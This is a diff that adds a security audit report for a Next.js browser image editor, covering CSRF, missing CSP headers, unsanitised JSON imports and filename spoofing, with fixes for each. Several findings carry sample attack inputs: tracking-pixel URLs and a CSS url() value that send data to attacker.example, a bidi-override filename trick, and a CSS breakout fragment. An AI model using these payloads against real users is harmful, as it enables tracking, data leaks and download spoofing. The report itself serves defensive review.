@@ -1,0 +1,738 @@
+================================================================================
+PHOTOSHOP WEB — SECURITY AUDIT REPORT
+================================================================================
+Scope:        Full repository (app/, components/, lib/, hooks/, config files,
+              dependency manifest). Excluded: node_modules, .next, .git, vendored
+              gsap-public/, gsap-skills-main/.
+Stack:        Next.js 16.2.6, React 19, TypeScript 5.7, Zod 3, ag-psd 30, Sharp,
+              Vercel Analytics, no auth/no DB.
+Server side:  Two API routes (/api/feedback, /api/subscribe) backed by an
+              append-only JSONL store under .data/.
+Client side:  Heavy in-browser editor (Canvas + Web Worker filters, PSD
+              round-trip, localStorage + IndexedDB persistence, scripting
+              console, plugin descriptors, large import surface for user JSON).
+npm audit:    0 vulnerabilities reported at audit time.
+
+Threat model assumed:
+  - Attackers are remote and unauthenticated.
+  - Users may import third-party PSDs, project files, brush/swatch/pattern/
+    asset/action/plugin/credential/droplet/shortcut JSON files.
+  - User documents are persisted in localStorage / IndexedDB and replayed on
+    next session, so a malicious imported file persists across reloads.
+  - The marketing API is served from the same origin as the editor.
+  - Self-XSS by the user typing into a textarea is out of scope; XSS triggered
+    by *opening another user's file* or by *visiting the site* is in scope.
+
+Severity ladder used in this report:
+  CRITICAL  Trivial unauth remote compromise of users or server data.
+  HIGH      Practical XSS, RCE, auth bypass, or large data exfiltration.
+  MEDIUM    Conditional XSS / CSRF / info disclosure / privacy regression.
+  LOW       Defense-in-depth gap, hardening miss, or low-impact misuse.
+  INFO      Code-quality concern with security implications, no exploit today.
+
+================================================================================
+HEADLINE
+================================================================================
+No CRITICAL or HIGH issues were confirmed. The most exploited surfaces — the
+scripting console, the filter Web Worker, and the marketing API — are well
+defended. The most actionable gaps are:
+
+  1. No origin/CSRF check on the two state-changing API routes (M-1).
+  2. GET /api/subscribe leaks total subscriber count without auth or rate
+     limit (M-2).
+  3. No Content-Security-Policy or other security response headers (M-3).
+  4. Imported project / recent-document / plugin / credential / droplet JSON
+     is spread into editor state with type checks but no schema or
+     allow-listing, enabling persistent privacy regressions (tracking pixels
+     fired on dialog open) and corrupted state injection (M-4 through M-6).
+  5. cleanText() does not strip Unicode bidi controls, allowing filename
+     spoofing in downloads of imported documents (L-1).
+
+================================================================================
+MEDIUM
+================================================================================
+
+--------------------------------------------------------------------------------
+M-1 — Missing Origin / Sec-Fetch-Site validation on state-changing routes
+--------------------------------------------------------------------------------
+Files:        app/api/subscribe/route.ts
+              app/api/feedback/route.ts
+
+Description:
+  POST /api/subscribe and POST /api/feedback do not validate the request
+  Origin, Referer, or Sec-Fetch-Site header. Today the JSON content-type
+  forces a CORS preflight from cross-origin pages, which provides incidental
+  protection. That protection breaks the moment any future code adds CORS
+  headers, switches to a simple-request body, or accepts form-encoded input.
+  GET /api/subscribe (see M-2) is a simple request and has no preflight at
+  all today.
+
+Impact:
+  Future CORS misconfiguration -> cross-site forgery of subscribe / feedback
+  records, attacker-controlled growth of the JSONL files, exhaustion of the
+  per-store byte/record quota, denial of service against future submissions.
+
+Recommended fix:
+  In each route handler, before the rate-limit check:
+
+      const allowed = new Set([
+        process.env.PUBLIC_ORIGIN,         // e.g. https://photoshop.example
+      ].filter(Boolean) as string[])
+      const origin = request.headers.get("origin")
+      const fetchSite = request.headers.get("sec-fetch-site")
+      if (origin && !allowed.has(origin)) {
+        return NextResponse.json(
+          { ok: false, error: "Forbidden" },
+          { status: 403 },
+        )
+      }
+      if (fetchSite && fetchSite !== "same-origin" && fetchSite !== "none") {
+        return NextResponse.json(
+          { ok: false, error: "Forbidden" },
+          { status: 403 },
+        )
+      }
+
+  Or migrate both endpoints to Next.js Server Actions, which validate Origin
+  by default.
+
+--------------------------------------------------------------------------------
+M-2 — GET /api/subscribe exposes subscriber total without auth or rate limit
+--------------------------------------------------------------------------------
+File:         app/api/subscribe/route.ts (export async function GET)
+
+Description:
+  GET /api/subscribe returns { ok: true, total: <subscriber count> } to any
+  caller. There is no auth, no origin check, no rate limit on the GET
+  handler (rate limiting is only invoked from POST). The same JSONL backing
+  store is read on every call.
+
+Impact:
+  - Information disclosure: anyone can scrape the subscriber growth curve.
+  - Denial of service: each GET re-reads the entire feedback file with no
+    upper bound on concurrent calls. The full file is parsed line-by-line on
+    every request — a single attacker can pin CPU and event-loop time at
+    near-zero cost.
+  - The GET path is a simple cross-site request and is not protected by the
+    CORS preflight that incidentally protects POST today.
+
+Recommended fix:
+  Choose one of:
+    a) Remove the GET handler. The total is not used by any UI in this repo
+       (newsletter-cta.tsx only reads `total` from the POST response).
+    b) Gate the GET behind an admin token (env var) and apply checkRateLimit
+       on the GET path the same way POST does.
+    c) Cache the count and return only a "yes/no" liveness instead of the
+       raw integer.
+
+  Apply the same Origin / Sec-Fetch-Site check from M-1 to the GET handler.
+
+--------------------------------------------------------------------------------
+M-3 — No Content-Security-Policy and no security response headers
+--------------------------------------------------------------------------------
+File:         next.config.mjs
+
+Description:
+  next.config.mjs configures `images.unoptimized` and
+  `experimental.optimizePackageImports` but does not declare a `headers()`
+  function. There is no Content-Security-Policy, no X-Frame-Options /
+  frame-ancestors, no Referrer-Policy, no X-Content-Type-Options,
+  no Permissions-Policy, and no Strict-Transport-Security. The only response
+  header set anywhere is `Retry-After` on a 429.
+
+Impact:
+  - A future XSS sink (any of M-4, M-5, M-6 if exploited, or any third-party
+    component update) goes from "blocked by CSP" to "fully exploitable".
+  - The page can be framed by any third-party origin (no
+    frame-ancestors / X-Frame-Options) -> clickjacking on dialogs that
+    perform sensitive actions (clear all recent docs, delete an autosave).
+  - Outbound requests via background-image: url(...) (see M-5) are
+    unrestricted.
+
+Recommended fix:
+  Add to next.config.mjs:
+
+      const securityHeaders = [
+        { key: "Content-Security-Policy", value: [
+          "default-src 'self'",
+          "script-src 'self' 'unsafe-inline' https://va.vercel-scripts.com",
+            // 'unsafe-inline' is currently required for the
+            // beforeInteractive strip-extension script in app/layout.tsx;
+            // migrate it to a nonce or move to afterInteractive to drop this.
+          "style-src 'self' 'unsafe-inline'",
+          "img-src 'self' data: blob:",
+          "font-src 'self' data:",
+          "connect-src 'self' https://vitals.vercel-insights.com",
+          "worker-src 'self' blob:",
+          "frame-src 'self'",
+          "object-src 'none'",
+          "base-uri 'self'",
+          "form-action 'self'",
+          "frame-ancestors 'none'",
+        ].join("; ") },
+        { key: "X-Content-Type-Options", value: "nosniff" },
+        { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
+        { key: "Permissions-Policy",
+          value: "camera=(), microphone=(), geolocation=()" },
+        { key: "X-Frame-Options", value: "DENY" },
+      ]
+
+      const nextConfig = {
+        // ... existing config
+        async headers() {
+          return [{ source: "/:path*", headers: securityHeaders }]
+        },
+      }
+
+  Verify the editor still functions with the CSP applied, especially the
+  filter Web Worker (worker-src 'self' blob:), the print preview window,
+  and Vercel Analytics. Tighten 'unsafe-inline' on script-src to a nonce
+  once the inline strip-extension script is moved.
+
+--------------------------------------------------------------------------------
+M-4 — Recent document thumbnails accept arbitrary URLs and become tracking
+       pixels on dialog open
+--------------------------------------------------------------------------------
+Files:        components/photoshop/recent-documents.ts (normalizeRecentDocument)
+              components/photoshop/management-dialogs.tsx
+                (<img src={recent.thumbnail} ...>)
+
+Description:
+  normalizeRecentDocument validates id, name, kind, serialized, updatedAt,
+  but accepts `thumbnail` as any string:
+
+      thumbnail: typeof (item as RecentDocument).thumbnail === "string"
+        ? (item as RecentDocument).thumbnail
+        : undefined,
+
+  The thumbnail is then rendered as `<img src={recent.thumbnail}>` in the
+  recent-documents dialog (management-dialogs.tsx). A malicious or
+  tampered localStorage entry can set thumbnail to:
+
+      "https://attacker.example/track.png?leak=" + encodeURIComponent(...)
+
+  When the user opens File > Open Recent (or any view that lists recents),
+  the browser fires a GET to the attacker's URL automatically.
+
+Impact:
+  - Cross-session tracking pixel: any imported PSD or project that the
+    autosave layer turns into a recent doc can attach an external thumbnail.
+    On every reload the pixel fires with no user interaction.
+  - Network-side data leak: query strings can encode small payloads
+    (filename, doc id, timing) to an external host.
+  - Not XSS in modern browsers: javascript: URLs are not executed in
+    img.src; data:text/html is not loaded; SVG via img is rendered without
+    scripts. The risk is privacy and side-channel, not code execution.
+
+Recommended fix:
+  In normalizeRecentDocument, allow only data: URLs of expected image
+  MIME types and below a sane size:
+
+      const SAFE_THUMB =
+        /^data:image\/(?:png|jpeg|webp);base64,[A-Za-z0-9+/=]+$/i
+      const thumbnail = typeof item.thumbnail === "string"
+        && item.thumbnail.length <= 200_000
+        && SAFE_THUMB.test(item.thumbnail)
+          ? item.thumbnail
+          : undefined
+
+  Apply the same regex on the write side (rememberRecentDocument) so a
+  hostile path cannot inject a bypass.
+
+--------------------------------------------------------------------------------
+M-5 — deserializeProject spreads untrusted JSON fields into editor state
+--------------------------------------------------------------------------------
+File:         components/photoshop/document-io.ts (deserializeProject,
+              ~line 1789)
+
+Description:
+  After validating layers, channels, dimensions, and selection, the loader
+  spreads the remaining JSON object verbatim:
+
+      const { layers, channels, selection,
+              quickMaskCanvasDataUrl, id, ...docRest } = source
+      ...
+      return {
+        ...docRest,                    // <-- untrusted keys retained
+        id: uid("doc"),
+        name: cleanText(source.name, "Loaded Project"),
+        ...
+        background: typeof source.background === "string"
+          ? source.background : "#ffffff",
+        gridColor: source.gridColor ?? "#78b4ff",
+        globalLight: source.globalLight ?? { angle: 120, altitude: 30 },
+        slices: Array.isArray(source.slices) ? source.slices : [],
+        ...
+      } as PsDocument
+
+  Several fields receive only `typeof === "string"` checks:
+    - background, gridColor (used directly as CSS color values)
+    - globalLight (object with angle/altitude — used in shading math)
+    - slices (passed through as-is if it's an array)
+    - colorMode, bitDepth, colorManagement, metadata
+  Anything in `docRest` that does not collide with the explicitly-set fields
+  is preserved on the document.
+
+Impact:
+  - A malicious project file can carry a CSS color string with a url()
+    function:
+        "background": "url(http://attacker/p.gif?leak=)"
+    When this string is later assigned to a CSS property (e.g. via
+    `style={{ background: doc.background }}` somewhere downstream, or
+    persisted into a CSS-injection-capable surface), the browser fetches
+    the URL. This is a passive tracking-pixel/SSRF-lite channel.
+  - Extra `docRest` keys persist into autosave, recent docs, and exports,
+    poisoning later round-trips.
+  - Prototype pollution via `__proto__` is NOT triggered by the spread
+    (own-property copy), but a future code path that does
+    `Object.assign(target, doc)` or `_.merge(target, doc)` would become
+    pollutable.
+
+Recommended fix:
+  Replace the open spread with an explicit allow-list:
+
+      return {
+        id: uid("doc"),
+        name: cleanText(source.name, "Loaded Project"),
+        width, height,
+        zoom: clampNumber(source.zoom, 0.05, 64, 1),
+        layers, channels, activeLayerId, selectedLayerIds,
+        background: cleanCssColor(source.background, "#ffffff"),
+        gridColor: cleanCssColor(source.gridColor, "#78b4ff"),
+        gridOpacity: clampNumber(source.gridOpacity, 0, 1, 0.42),
+        gridSize: clampNumber(source.gridSize, 1, 10000, 50),
+        gridSubdivisions: clampNumber(source.gridSubdivisions, 1, 64, 1),
+        showGrid: source.showGrid === true,
+        showSmartGuides: source.showSmartGuides !== false,
+        showPixelGrid: source.showPixelGrid === true,
+        snap: source.snap !== false,
+        snapToGrid: source.snapToGrid === true,
+        snapToGuides: source.snapToGuides !== false,
+        rotation: clampNumber(source.rotation, -360, 360, 0),
+        guides: Array.isArray(source.guides) ? source.guides : [],
+        slices: cleanSlices(source.slices),                  // schema-check
+        globalLight: cleanGlobalLight(source.globalLight),   // schema-check
+        colorMode: APP_COLOR_MODES.has(source.colorMode)
+          ? source.colorMode : "RGB",
+        bitDepth: APP_BIT_DEPTHS.has(source.bitDepth)
+          ? source.bitDepth : 8,
+        quickMask: source.quickMask === true,
+        quickMaskCanvas, selection: { ... },
+        // and only the metadata fields you actually use:
+        colorManagement: cleanColorManagement(source.colorManagement),
+        metadata: cleanMetadata(source.metadata),
+      } satisfies PsDocument
+
+  where cleanCssColor uses the same allow-list pattern as
+  isSafeSvgColor in document-io.ts (hex / rgb()/rgba()/hsl()/hsla() with
+  numeric args / named-color allowlist).
+
+--------------------------------------------------------------------------------
+M-6 — Droplet, content-credential, and plugin imports parse JSON without a
+       schema or prototype-key filter
+--------------------------------------------------------------------------------
+File:         components/photoshop/advanced-subsystems-dialog.tsx
+              (importDroplet, importCredentials, importPlugin)
+
+Description:
+  Three importers in advanced-subsystems-dialog.tsx do raw JSON.parse +
+  spread:
+
+      // Droplet
+      const parsed = JSON.parse(await file.text()) as { asset?: AssetLibraryItem }
+      ...
+      setAssets([{ ...parsed.asset, id: uid("auto"), createdAt: Date.now() },
+                 ...assets])
+
+      // Credentials
+      const parsed = JSON.parse(await file.text()) as
+        { credentials?: ContentCredential[] } | ContentCredential
+      const imported = Array.isArray(parsed.credentials)
+        ? parsed.credentials
+        : [parsed]
+      dispatch({ type: "set-document-metadata",
+                 metadata: { ...activeDoc.metadata,
+                             contentCredentials: [...imported, ...credentials] }})
+
+      // Plugin
+      const parsed = JSON.parse(await file.text()) as
+        PluginDescriptor | { plugins: PluginDescriptor[] }
+      const imported = Array.isArray(parsed.plugins) ? parsed.plugins : [parsed]
+      setPlugins([...imported.map((plugin) => ({ ...plugin,
+                                                 id: uid("plugin"),
+                                                 createdAt: Date.now(),
+                                                 enabled: plugin.enabled !== false })),
+                  ...plugins])
+
+  Compare to assets-panel.tsx and brush-panel.tsx, which DO apply
+  RESERVED_KEYS, isSafeRecordKey, IMAGE_DATA_URL, and bounded numeric/string
+  cleaning. The droplet/credentials/plugin path has only a file-size guard
+  (assertAdvancedFileSize).
+
+  Plugin descriptors then flow into:
+    a) <iframe sandbox="" srcDoc={selected.panelHtml}>           — sandboxed,
+       so HTML in panelHtml cannot run scripts. Empty sandbox still allows
+       sub-resource loads (img, css, font), so a malicious plugin can carry
+       a tracking pixel that fires when the plugin is selected.
+    b) applyPluginFilterToCanvas — uses filterKernel as numbers; lacks a
+       finite-number check (NaN propagates, garbled output, no security
+       impact).
+
+Impact:
+  - Persistent privacy regression: imported plugin/credential/droplet
+    objects with tracking-pixel HTML or CSS-color strings get autosaved
+    and replay on every reload.
+  - State corruption / dispatch with arbitrary keys (e.g.
+    `metadata.contentCredentials` ends up containing prototype-shaped or
+    non-spec objects), increasing the blast radius of any future code that
+    does deep-merge or template-render.
+  - No XSS today because (i) the iframe sandbox blocks scripts and
+    (ii) credential strings are rendered as React children (auto-escaped).
+
+Recommended fix:
+  Introduce a normalizer per import (alongside existing assets-panel
+  helpers) that:
+    - Rejects RESERVED_KEYS and any key not matching /^[A-Za-z0-9_-]+$/.
+    - Caps string lengths (name/version/actor/assertion ~ 120 chars).
+    - For plugins: sanitize panelHtml with an HTML allow-list (or, simpler,
+      strip tags entirely and render as plain text since the iframe sandbox
+      already prevents scripting).
+    - For 8BF kernels: require 9 finite numbers in [-32, 32] and a finite
+      divisor / bias.
+    - For credentials: validate documentHash matches /^[0-9a-f]{64}$/ and
+      that layerCount, createdAt are finite numbers.
+  Apply the same `Object.freeze`-on-import pattern used elsewhere if you
+  also want to harden against accidental mutation by reducers.
+
+================================================================================
+LOW
+================================================================================
+
+--------------------------------------------------------------------------------
+L-1 — cleanText() does not strip Unicode bidi/zero-width controls,
+       enabling filename-spoofing on download
+--------------------------------------------------------------------------------
+File:         components/photoshop/document-io.ts (cleanText, ~line 355)
+
+      function cleanText(value, fallback, maxLength = 120) {
+        if (typeof value !== "string") return fallback
+        const text = value.replace(/[\u0000-\u001f\u007f]/g, "")
+                          .trim().slice(0, maxLength)
+        return text || fallback
+      }
+
+  The regex strips C0 controls (0x00–0x1F) and DEL (0x7F) but leaves
+  Unicode bidi controls (U+202A–E, U+200E/F) and zero-width characters
+  (U+200B–D, U+FEFF). A malicious imported PSD or project can carry a
+  document name like:
+      "report" + "\u202E" + "gnp.exe-frames.json"
+  which renders as "reportnosj.semarf-exe.png" and gets used as the
+  default download filename in many places (timeline-panel.tsx,
+  assets-panel.tsx, gap-panels.tsx, slices-panel.tsx, batch-export-dialog,
+  etc.).
+
+Impact:
+  Phishing / extension-spoofing on the user's downloads folder. Particularly
+  bad for anyone sharing project files.
+
+Recommended fix:
+      const text = value
+        .replace(/[\u0000-\u001f\u007f]/g, "")
+        .replace(/[\u200B-\u200F\u2028-\u202E\u2066-\u2069\uFEFF]/g, "")
+        .trim()
+        .slice(0, maxLength)
+
+  Optionally also normalize with String.prototype.normalize("NFC") to
+  collapse combining-character abuse.
+
+--------------------------------------------------------------------------------
+L-2 — PSD layer name skips cleanText
+--------------------------------------------------------------------------------
+File:         components/photoshop/document-io.ts (flattenPsdChildren,
+              ~line 1873)
+
+  child.name is assigned directly to Layer.name, unlike most other text
+  paths which call cleanText. React escapes children on render, so this is
+  not exploitable as XSS, but malformed control characters render oddly in
+  the Layers panel and propagate into download filenames (see L-1).
+
+Recommended fix:
+      name: cleanText(child.name, "Layer", 120),
+      // and the same for the group branch
+
+--------------------------------------------------------------------------------
+L-3 — 8BF plugin filter does not validate kernel/divisor/bias as finite
+--------------------------------------------------------------------------------
+File:         components/photoshop/advanced-subsystems.ts
+              (applyPluginFilterToCanvas, ~line 1166)
+
+  The function checks plugin.filterKernel.length === 9 but does not check
+  that each element is a finite number. NaN/string elements produce
+  garbled output. Not a security risk in itself, but it is an input-
+  validation gap and pairs poorly with M-6.
+
+Recommended fix:
+      if (!plugin.filterKernel.every((n) => typeof n === "number"
+                                            && Number.isFinite(n))) return canvas
+      const divisor = Number.isFinite(plugin.filterDivisor)
+        ? plugin.filterDivisor
+        : (plugin.filterKernel.reduce((a, b) => a + b, 0) || 1)
+      const bias = Number.isFinite(plugin.filterBias) ? plugin.filterBias : 0
+
+--------------------------------------------------------------------------------
+L-4 — loadPersistedSettings spreads localStorage values without filtering
+--------------------------------------------------------------------------------
+File:         components/photoshop/editor-context.tsx (loadPersistedSettings,
+              ~line 3380)
+
+      if (s.brush && typeof s.brush === "object")
+        out.brush = { ...initialState.brush, ...s.brush }
+
+  s comes from JSON.parse(localStorage.getItem(SETTINGS_KEY)). An attacker
+  who can write to localStorage (i.e. has already obtained same-origin
+  scripting rights) can inject extra keys onto state.brush. The spread
+  copies own enumerable properties only and does not pollute Object.prototype,
+  so this is defense-in-depth, not a vulnerability today.
+
+Recommended fix:
+  Whitelist brush keys, e.g.:
+      const safeBrush: Partial<BrushSettings> = {}
+      for (const key of ["size","hardness","opacity","flow","smoothing",
+                         "spacing","tipShape"] as const) {
+        if (key in s.brush) safeBrush[key] = s.brush[key]
+      }
+      out.brush = { ...initialState.brush, ...safeBrush }
+  Also reject keys equal to "__proto__"/"prototype"/"constructor".
+
+--------------------------------------------------------------------------------
+L-5 — chart.tsx contains dangerouslySetInnerHTML for CSS but is dead code
+--------------------------------------------------------------------------------
+File:         components/ui/chart.tsx (~line 80)
+
+  ChartStyle component injects per-theme CSS via dangerouslySetInnerHTML
+  with the chart `id` (from React useId(), safe) and color values from
+  `config` (developer-supplied today, not user-supplied at runtime).
+  No file in the repo imports `@/components/ui/chart` other than the file
+  itself, so the component is unreachable. If it is later wired up to
+  user-controlled config, an attacker could inject `; }/* */ malicious-css
+  to break out of the rule.
+
+Recommended fix:
+  Either delete the file, or quote/validate color values:
+
+      const safeColor = /^#[0-9a-f]{3,8}$|^(rgb|rgba|hsl|hsla)\([^)]+\)$|^[a-z-]+$/i
+        .test(color) ? color : null
+
+--------------------------------------------------------------------------------
+L-6 — window.open("", "_blank") for print preview without rel=noopener
+--------------------------------------------------------------------------------
+Files:        components/photoshop/menu-bar.tsx (~line 1516)
+              components/photoshop/advanced-subsystems-dialog.tsx (~line 658)
+
+  Both print paths do `window.open("", "_blank")` and write image markup
+  via createElement / appendChild (no document.write, no innerHTML; so no
+  XSS). The new window has an "about:blank" URL and inherits the opener's
+  origin, which means rel=noopener is not strictly necessary — but it is
+  best practice and the reverse `window.opener` reference is currently
+  available to whatever code (e.g. a future browser extension) injects
+  itself into the popup.
+
+Recommended fix:
+      const win = window.open("", "_blank", "noopener,noreferrer")
+      // or, for the popup we still need to write into:
+      const win = window.open("about:blank", "_blank")
+      if (win) {
+        win.opener = null
+        ...
+      }
+
+--------------------------------------------------------------------------------
+L-7 — Stock-image URL field accepts arbitrary URLs
+--------------------------------------------------------------------------------
+File:         components/photoshop/advanced-subsystems-dialog.tsx
+              (LibrariesWorkspace.placeStock)
+
+  `stockUrl` is a free-form text input that becomes `img.src`. Browsers
+  reject javascript: and most non-http schemes for img.src. The risk
+  surface is "user typed a URL the user themselves typed", which is not a
+  third-party-attacker scenario. Note for completeness only.
+
+Recommended fix:
+  Restrict to http(s) and a small allow-list of stock providers, or
+  validate via new URL(stockUrl).protocol === "https:".
+
+--------------------------------------------------------------------------------
+L-8 — Inline script via dangerouslySetInnerHTML in app/layout.tsx blocks
+       a strict CSP migration
+--------------------------------------------------------------------------------
+File:         app/layout.tsx
+
+  The strip-extension-attributes script is injected as inline JS via
+  <Script id=... strategy="beforeInteractive" dangerouslySetInnerHTML=...>.
+  The content is a static template literal with no user input, so it is
+  safe today. It does, however, force `'unsafe-inline'` in any future
+  script-src CSP (M-3).
+
+Recommended fix:
+  Move the script to a separate file under public/ or src/scripts/ and
+  reference it with a `src=` attribute, then drop 'unsafe-inline' from
+  the CSP. Alternatively, generate a per-request nonce in middleware and
+  attach it to both the <Script> tag and the script-src directive.
+
+================================================================================
+INFORMATIONAL
+================================================================================
+
+I-1 — JSON.parse(JSON.stringify(...)) deep-clone pattern is used in several
+      files (editor-context.tsx, menu-bar.tsx, layer-style-dialog.tsx,
+      camera-raw-engine.ts, preferences-engine.ts, warp-text-dialog.tsx).
+      Current callers validate input before cloning, so prototype pollution
+      is not reachable. Prefer structuredClone where supported and keep
+      JSON-clone only for serialisation paths.
+
+I-2 — Both API route handlers log full errors via `console.error`. This is
+      fine, but in production those logs may surface stack traces in the
+      hosting platform's log explorer; do not expose them to users (the
+      handlers correctly return generic error messages today). Confirm
+      log retention and access controls match the data classification of
+      the JSONL store.
+
+I-3 — User-Agent strings of feedback submitters are stored in the JSONL
+      file (see app/api/feedback/route.ts). Depending on jurisdiction this
+      may be considered PII; document the retention policy and add a
+      take-down endpoint if needed.
+
+I-4 — Vercel Analytics is enabled in production
+      (app/layout.tsx, line ~75). This sends pageview data to a
+      third-party. If you target jurisdictions requiring analytics consent
+      (EU/UK), gate the <Analytics /> component behind a consent flag.
+
+I-5 — next.config.mjs sets `images: { unoptimized: true }`. This disables
+      Next.js image optimisation and any of its hardening (size limits,
+      remote-pattern allowlists). Re-enable image optimisation if you
+      ever start fetching <Image src> from external origins.
+
+I-6 — localStorage values are not encrypted (expected). Document.serialized
+      strings are full project payloads with all layer raster data — be
+      aware that any other XSS/extension on the same origin can read the
+      user's full project history.
+
+I-7 — In-memory rate-limit map (lib/marketing-store.ts) uses
+      `getClientIp(request)`, which trusts X-Forwarded-For. Behind an HTTP
+      proxy that does not strip incoming X-Forwarded-For, an attacker can
+      forge the header to evade rate limits. Confirm the deploy
+      environment terminates and rewrites X-Forwarded-For (Vercel does;
+      a self-hosted reverse proxy may not).
+      Recommended fix: support a single trusted-proxy mode, or read only
+      a runtime-configured trusted header (e.g. CF-Connecting-IP, a
+      Vercel-specific header).
+
+I-8 — In-memory rate limiting only works on a single Node process. If the
+      app is ever scaled horizontally (multiple replicas, edge runtime
+      fan-out) the limiter is bypassed by hitting different instances.
+      Move to a shared store (Redis/Upstash) or rely on the platform's
+      rate-limiter when scaling.
+
+I-9 — package-lock.json overrides `fast-uri` to 3.1.2 and pins postcss to
+      8.5.14 inside next. Track these overrides — when removing them,
+      re-run `npm audit` and `npm ls` to verify no transitive regression.
+
+I-10 — Next.js 16.2.6 and React 19 are recent majors. `npm audit` returns
+      0 vulnerabilities at the time of this audit, but new advisories
+      land regularly. Wire `npm audit --omit=dev --audit-level=high` (or
+      Dependabot / Renovate) into CI.
+
+================================================================================
+ITEMS THAT WERE INVESTIGATED AND ARE SAFE
+================================================================================
+
+S-1   The scripting console (components/photoshop/panels/scripting-panel.tsx)
+      does NOT use eval / new Function / Function constructor. It parses
+      input via a regex, only allows a fixed allow-list of method names
+      (SCRIPT_METHODS), and parses arguments as JSON.parse on a bracketed
+      array. Bound checks (clamp), color regex (HEX_COLOR), and cleanName
+      are applied per argument. Safe.
+
+S-2   The filter Web Worker (components/photoshop/filter-worker.ts) is
+      created from a Blob URL whose contents are a hardcoded JS template
+      string. No user input is concatenated into the worker source. The
+      worker only receives a typed { filterId, params, buffer } payload,
+      and only known filterIds are dispatched. Safe.
+
+S-3   The plugin runtime <iframe sandbox="" srcDoc={panelHtml}> blocks
+      script execution and same-origin inheritance. HTML in panelHtml
+      cannot run JS or read parent-frame data. The iframe can still load
+      sub-resources (img, css, font), which is the privacy concern noted
+      in M-6.
+
+S-4   The marketing API enforces:
+        - Body size limit (lib/marketing-store.ts: readJsonWithLimit
+          checks Content-Length AND the streamed byte count).
+        - Per-IP token-bucket rate limiting (checkRateLimit).
+        - Per-store byte / record quotas (assertStoreCanAppend) so the
+          JSONL file cannot grow without bound.
+        - Subscriber dedup by SHA-256-hashed email id.
+        - Zod schema validation on POST bodies before persistence.
+      A focused Playwright suite (tests/marketing-security.spec.ts,
+      tests/security-regression-limits.spec.ts) covers these guarantees.
+
+S-5   PSD parsing (ag-psd) is fronted by header sniffing
+      (validatePsdHeaderDimensions) and explicit canvas-pixel /
+      canvas-dimension caps (assertCanvasSize, MAX_CANVAS_PIXELS).
+      Project import enforces MAX_PROJECT_LAYERS, MAX_PROJECT_CHANNELS,
+      MAX_PROJECT_DATA_URL_CHARS, and SAFE_CANVAS_DATA_URL on every
+      embedded data URL.
+
+S-6   Pattern, swatch, asset, and brush importers (patterns-panel.tsx,
+      swatches-panel.tsx, assets-panel.tsx, brush-panel.tsx) apply
+      RESERVED_KEYS / isSafeRecordKey / IMAGE_DATA_URL / hex-color
+      regex / depth and length caps to user JSON. Safe.
+
+S-7   SVG export (exportSvgDataUrl in document-io.ts) escapes the document
+      name into a CDATA section (escapeForCData) and validates the matte
+      colour against a strict allow-list (isSafeSvgColor) before injecting
+      it into an attribute.
+
+S-8   PDF-presentation HTML generator (gap-workflow-dialog.tsx) escapes
+      filenames with a per-character escapeHtml before interpolating
+      into <img alt> and <p>, and embeds the image as canvas.toDataURL
+      ("image/png").
+
+S-9   Drag-and-drop interactions (layers-panel.tsx, document-tabs.tsx,
+      panel-dock.tsx) carry only application/x-ps-* MIME types with
+      validated payloads (JSON-parsed array of string IDs that must
+      exist in activeDoc.layers). Safe.
+
+S-10  No usage of dangerouslySetInnerHTML, innerHTML =, outerHTML =,
+      document.write, eval, or new Function across the editor source.
+      Only two dangerouslySetInnerHTML sinks exist (app/layout.tsx,
+      components/ui/chart.tsx), and both are covered above.
+
+================================================================================
+SUGGESTED REMEDIATION ORDER
+================================================================================
+
+1. M-3 (CSP + security headers) — highest leverage, single config-file
+   change, mitigates a large fraction of every other class of issue and
+   anything we missed.
+2. M-1 + M-2 (origin check on POST and decision on GET subscribe) — short
+   diff, eliminates the most plausible cross-site abuse path.
+3. M-4 (validate recent-doc thumbnail) — small, persistent privacy bug;
+   one regex.
+4. L-1 (strip bidi controls in cleanText) — one regex; closes filename
+   spoofing.
+5. L-2 (apply cleanText to PSD layer names) — already in the existing
+   informational list.
+6. M-5 + M-6 (replace open spreads with allow-listed schemas in
+   deserializeProject and the three advanced-subsystems importers) —
+   larger diff, follow the pattern already used in assets-panel.tsx.
+7. L-3, L-4, L-5, L-6, L-7, L-8 — defense-in-depth cleanup as time allows.
+
+After M-1..M-6 land, add Playwright coverage modeled on
+marketing-security.spec.ts that imports a malicious project / recent doc /
+plugin descriptor and asserts no external network request fires and no
+unknown keys appear on the resulting document.
+
+================================================================================
+END OF REPORT
+================================================================================
